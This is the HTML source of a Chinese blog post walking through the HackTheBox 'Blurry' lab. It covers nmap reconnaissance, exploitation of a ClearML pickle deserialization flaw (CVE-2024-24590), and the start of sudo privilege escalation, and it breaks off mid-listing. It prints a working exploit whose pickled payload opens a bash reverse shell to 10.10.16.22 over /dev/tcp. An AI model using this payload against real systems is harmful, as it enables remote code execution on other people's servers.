@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Allegro AI ClearML反序列化漏洞、python劫持torch库">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Blurry">
+<meta property="og:url" content="https://sun-zzz.github.io/article/Blurry.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="Allegro AI ClearML反序列化漏洞、python劫持torch库">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901170301112.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901170507053.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901170821690.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901170946532.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901173542984.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901192341943.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901192944222.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901193604495.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901193721425.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901192013689.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901194034377.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901194121364.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901195819905.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901234440204.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901235511794.png">
+<meta property="article:published_time" content="2024-09-01T08:21:18.000Z">
+<meta property="article:modified_time" content="2024-09-01T16:00:34.866Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/Blurry/image-20240901170301112.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/Blurry.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Blurry | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/Blurry.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Blurry
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-09-01 16:21:18" itemprop="dateCreated datePublished" datetime="2024-09-01T16:21:18+08:00">2024-09-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-02 00:00:34" itemprop="dateModified" datetime="2024-09-02T00:00:34+08:00">2024-09-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/Blurry.html" class="post-meta-item leancloud_visitors" data-flag-title="Blurry" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/Blurry.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/Blurry.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Allegro AI ClearML反序列化漏洞、python劫持torch库</p>
+<span id="more"></span>
+
+<h1 id="Blurry"><a href="#Blurry" class="headerlink" title="Blurry"></a>Blurry</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -v --min-rate 10000 10.10.11.19</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)</span><br><span class="line">|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)</span><br><span class="line">|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)</span><br><span class="line">80/tcp open  http</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://app.blurry.htb/</span><br></pre></td></tr></table></figure>
+
+<p>可以发现80端口出现重定向，我们添加域名到<code>/etc/hosts</code></p>
+<p>继续扫描下目录，选定响应状态为200&#x2F;301</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://app.blurry.htb/ -i 200,301</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Blurry/image-20240901170301112.png"></p>
+<p>不过没什么收获，我们直接访问下发现是名为clearml的平台</p>
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>登录进去，百度了解到是用于机器学习的</p>
+<p><img src="/article/Blurry/image-20240901170507053.png"></p>
+<p>经过一番搜索发现存在pickle反序列化漏洞</p>
+<p>我们点击左侧的项目，然后创建新的项目以及实验</p>
+<p><img src="/article/Blurry/image-20240901170821690.png"></p>
+<p>依次执行并粘贴config</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install clearml</span><br><span class="line">clearml-init</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Blurry/image-20240901170946532.png"></p>
+<p>不过这里出现了报错</p>
+<p><img src="/article/Blurry/image-20240901173542984.png"></p>
+<p>需要将API和Files的域名也添加到<code>/etc/hosts</code>去。重新初始化clearml，成功在<code>/home/rev1ve</code>建立<code>clearml.conf</code>文件</p>
+<p>经过一番查找，注意到Black Swan项目的<code>Review JSON Artifacts</code>实验</p>
+<p><img src="/article/Blurry/image-20240901192341943.png"></p>
+<p>具体脚本内容如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> clearml <span class="keyword">import</span> Task</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> clearml.backend_api.session.client <span class="keyword">import</span> APIClient</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_json_artifact</span>(<span class="params">data, artifact_name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Process a JSON artifact represented as a Python dictionary.</span></span><br><span class="line"><span class="string">    Print all key-value pairs contained in the dictionary.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Artifact &#x27;<span class="subst">&#123;artifact_name&#125;</span>&#x27; Contents:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot; - <span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_task</span>(<span class="params">task</span>):</span><br><span class="line">    artifacts = task.artifacts</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> artifact_name, artifact_object <span class="keyword">in</span> artifacts.items():</span><br><span class="line">        data = artifact_object.get()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">dict</span>):</span><br><span class="line">            process_json_artifact(data, artifact_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Artifact &#x27;<span class="subst">&#123;artifact_name&#125;</span>&#x27; content is not a dictionary.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    review_task = Task.init(project_name=<span class="string">&quot;Black Swan&quot;</span>, </span><br><span class="line">                            task_name=<span class="string">&quot;Review JSON Artifacts&quot;</span>, </span><br><span class="line">                            task_type=Task.TaskTypes.data_processing)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Retrieve tasks tagged for review</span></span><br><span class="line">    tasks = Task.get_tasks(project_name=<span class="string">&#x27;Black Swan&#x27;</span>, tags=[<span class="string">&quot;review&quot;</span>], allow_archived=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tasks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] No tasks up for review.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Reviewing artifacts from task: <span class="subst">&#123;task.name&#125;</span> (ID: <span class="subst">&#123;task.<span class="built_in">id</span>&#125;</span>)&quot;</span>)</span><br><span class="line">        p = Process(target=process_task, args=(task,))</span><br><span class="line">        p.start()</span><br><span class="line">        threads.append(p)</span><br><span class="line">        task.set_archived(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> thread.is_alive():</span><br><span class="line">            thread.terminate()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Mark the ClearML task as completed</span></span><br><span class="line">    review_task.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cleanup</span>():</span><br><span class="line">    client = APIClient()</span><br><span class="line">    tasks = client.tasks.get_all(</span><br><span class="line">        system_tags=[<span class="string">&quot;archived&quot;</span>],</span><br><span class="line">        only_fields=[<span class="string">&quot;id&quot;</span>],</span><br><span class="line">        order_by=[<span class="string">&quot;-last_update&quot;</span>],</span><br><span class="line">        page_size=<span class="number">100</span>,</span><br><span class="line">        page=<span class="number">0</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># delete and cleanup tasks</span></span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        <span class="comment"># noinspection PyBroadException</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            deleted_task = Task.get_task(task_id=task.<span class="built_in">id</span>)</span><br><span class="line">            deleted_task.delete(</span><br><span class="line">                delete_artifacts_and_models=<span class="literal">True</span>,</span><br><span class="line">                skip_models_used_by_other_tasks=<span class="literal">True</span>,</span><br><span class="line">                raise_on_error=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    cleanup()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>大概作用就是检索所有标记为”review”的项目名为”Black Swan”的任务，并且这里我们注意到对应clearml的版本1.13.1</p>
+<p>网上搜索存在cve-2024-24590漏洞，exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> clearml <span class="keyword">import</span> Task</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunCommand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.22/1028 0&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">command = RunCommand()</span><br><span class="line"></span><br><span class="line">task = Task.init(project_name=<span class="string">&#x27;Black Swan&#x27;</span>, task_name=<span class="string">&#x27;pickle_artifact_upload&#x27;</span>, tags=[<span class="string">&quot;review&quot;</span>])</span><br><span class="line">task.upload_artifact(name=<span class="string">&#x27;pickle_artifact&#x27;</span>, artifact_object=command, retries=<span class="number">2</span>, wait_on_upload=<span class="literal">True</span>, extension_name=<span class="string">&quot;.pkl&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>把exp放到和<code>clearml.conf</code>文件同一目录下，运行发现报错</p>
+<p><img src="/article/Blurry/image-20240901192944222.png"></p>
+<p>这里网上搜了下应该是urllib3版本问题，尝试升级</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install --upgrade urllib3</span><br></pre></td></tr></table></figure>
+
+<p>不过还是不行，还可以试试python的venv模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install virtualenv</span><br><span class="line">virtualenv venv                #创建venv文件夹</span><br><span class="line">source venv/bin/activate       #进入虚拟环境</span><br><span class="line">pip install clearml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Blurry/image-20240901193604495.png"></p>
+<p>安装成功后，监听1028端口然后执行payload</p>
+<p><img src="/article/Blurry/image-20240901193721425.png"></p>
+<p>我们也可以看看实验是否在运行</p>
+<p><img src="/article/Blurry/image-20240901192013689.png"></p>
+<p>等实验运行完就可以收到反弹的shell，拿到user的flag</p>
+<p><img src="/article/Blurry/image-20240901194034377.png"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试sudo提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Blurry/image-20240901194121364.png"></p>
+<p>我们看下<code>/usr/bin/evaluate_model</code>具体执行内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># Evaluate a given model against our proprietary dataset.</span><br><span class="line"># Security checks against model file included.</span><br><span class="line"></span><br><span class="line">if [ &quot;$#&quot; -ne 1 ]; then</span><br><span class="line">    /usr/bin/echo &quot;Usage: $0 &lt;path_to_model.pth&gt;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">MODEL_FILE=&quot;$1&quot;</span><br><span class="line">TEMP_DIR=&quot;/opt/temp&quot;</span><br><span class="line">PYTHON_SCRIPT=&quot;/models/evaluate_model.py&quot;  </span><br><span class="line"></span><br><span class="line">/usr/bin/mkdir -p &quot;$TEMP_DIR&quot;</span><br><span class="line"></span><br><span class="line">file_type=$(/usr/bin/file --brief &quot;$MODEL_FILE&quot;)</span><br><span class="line"></span><br><span class="line"># Extract based on file type</span><br><span class="line">if [[ &quot;$file_type&quot; == *&quot;POSIX tar archive&quot;* ]]; then</span><br><span class="line">    # POSIX tar archive (older PyTorch format)</span><br><span class="line">    /usr/bin/tar -xf &quot;$MODEL_FILE&quot; -C &quot;$TEMP_DIR&quot;</span><br><span class="line">elif [[ &quot;$file_type&quot; == *&quot;Zip archive data&quot;* ]]; then</span><br><span class="line">    # Zip archive (newer PyTorch format)</span><br><span class="line">    /usr/bin/unzip -q &quot;$MODEL_FILE&quot; -d &quot;$TEMP_DIR&quot;</span><br><span class="line">else</span><br><span class="line">    /usr/bin/echo &quot;[!] Unknown or unsupported file format for $MODEL_FILE&quot;</span><br><span class="line">    exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">/usr/bin/find &quot;$TEMP_DIR&quot; -type f \( -name &quot;*.pkl&quot; -o -name &quot;pickle&quot; \) -print0 | while IFS= read -r -d $&#x27;\0&#x27; extracted_pkl; do</span><br><span class="line">    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 &quot;$extracted_pkl&quot;)</span><br><span class="line"></span><br><span class="line">    if /usr/bin/echo &quot;$fickling_output&quot; | /usr/bin/jq -e &#x27;select(.severity == &quot;OVERTLY_MALICIOUS&quot;)&#x27; &gt;/dev/null; then</span><br><span class="line">        /usr/bin/echo &quot;[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted.&quot;</span><br><span class="line">        /bin/rm &quot;$MODEL_FILE&quot;</span><br><span class="line">        break</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">/usr/bin/find &quot;$TEMP_DIR&quot; -type f -exec /bin/rm &#123;&#125; +</span><br><span class="line">/bin/rm -rf &quot;$TEMP_DIR&quot;</span><br><span class="line"></span><br><span class="line">if [ -f &quot;$MODEL_FILE&quot; ]; then</span><br><span class="line">    /usr/bin/echo &quot;[+] Model $MODEL_FILE is considered safe. Processing...&quot;</span><br><span class="line">    /usr/bin/python3 &quot;$PYTHON_SCRIPT&quot; &quot;$MODEL_FILE&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p>赋值变量，对文件进行审查。最后就是执行<code>/usr/bin/python3 &quot;$PYTHON_SCRIPT&quot; &quot;$MODEL_FILE&quot;</code>命令，往上看发现分别是<code>/model</code>下的两个文件</p>
+<p><img src="/article/Blurry/image-20240901195819905.png"></p>
+<p>跟进一下<code>evaluate_model.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span 